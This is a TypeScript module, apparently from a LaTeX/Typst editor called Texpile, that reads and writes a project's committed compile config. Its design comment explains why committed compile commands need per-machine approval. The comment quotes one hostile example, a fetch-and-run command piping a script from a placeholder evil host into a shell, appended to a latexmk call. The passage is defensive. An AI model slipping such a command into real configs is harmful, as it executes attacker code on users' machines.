// The project's own compile configuration, in .texpile/config.json, so it travels with the folder.
//
// Which file is the main one, which typesetter builds it and where the output lands are properties
// of the DOCUMENT, not of the person reading it. Keeping them in localStorage meant every
// collaborator who cloned the repo had to rediscover them. `lastFile` deliberately stays local:
// committing where you left off would rewrite the file
// on every tab switch and conflict with everyone.
//
// The command is different from the rest, and the difference is the whole design of this module.
// Texpile RUNS it. A committed command means cloning a repository can execute arbitrary shell on
// your machine, and `latexmk -pdf main.tex; curl evil.sh | sh` reads as unremarkable in a diff
// nobody looks at twice. So a command out of the file is never applied on its own: it has to be
// approved once per project on this machine, and everything else applies immediately. This is what
// VS Code's Workspace Trust is for, scoped down to the one setting here that can execute.
import { readTextFile, statFile, writeTextFile } from '$lib/workspace/fileSystem';
import { ensureTexpileIgnore } from '$lib/workspace/texpileDir';
import type { CompileOutputs } from '$lib/workspace/workspaceStore';

const CONFIG_PATH = '.texpile/config.json';

export interface ProjectFormatConfig {
	engine?: 'tectonic' | 'system';
	command?: string;
	outputs?: CompileOutputs;
}

export interface ProjectConfig {
	/** bumped only for a change an older build could not read */
	v: 1;
	/** root-relative main file */
	main?: string;
	/** which typesetter Compile drives; absent = auto, from the main file's extension */
	compile?: 'latex' | 'typst' | 'auto';
	latex?: ProjectFormatConfig;
	typst?: ProjectFormatConfig;
}

const configPath = (root: string) => `${root.replace(/[\\/]+$/, '')}/${CONFIG_PATH}`;

/**
 * Does the file exist at all?
 *
 * Separate from reading it because "absent" and "present but unreadable" have to be told apart:
 * seeding from local state is right for the first, and would destroy someone's config for the
 * second - a file from a newer Texpile reads as null here too.
 */
export async function hasProjectConfig(root: string): Promise<boolean> {
	return (await statFile(configPath(root))).exists;
}

/** null when there is no config, or one we cannot read: a project without one is the normal case */
export async function readProjectConfig(root: string): Promise<ProjectConfig | null> {
	try {
		const parsed: unknown = JSON.parse(await readTextFile(configPath(root)));
		if (typeof parsed !== 'object' || parsed === null) return null;
		const cfg = parsed as ProjectConfig;
		// a newer file is not read at all rather than half-applied: half of someone's build config
		// is worse than none of it
		return cfg.v === 1 ? cfg : null;
	} catch {
		return null;
	}
}

export async function writeProjectConfig(root: string, cfg: ProjectConfig): Promise<void> {
	try {
		// before the write, so the directory is never left holding an un-ignored file: most projects
		// reach .texpile through a compile setting rather than a comment, and seeding the rule only
		// from the comment log meant those showed up untracked in git status
		await ensureTexpileIgnore(root);
		await writeTextFile(configPath(root), JSON.stringify(cfg, null, '\t') + '\n');
	} catch {
		// a read-only or unwritable project still compiles; the local copy is the source of truth
	}
}
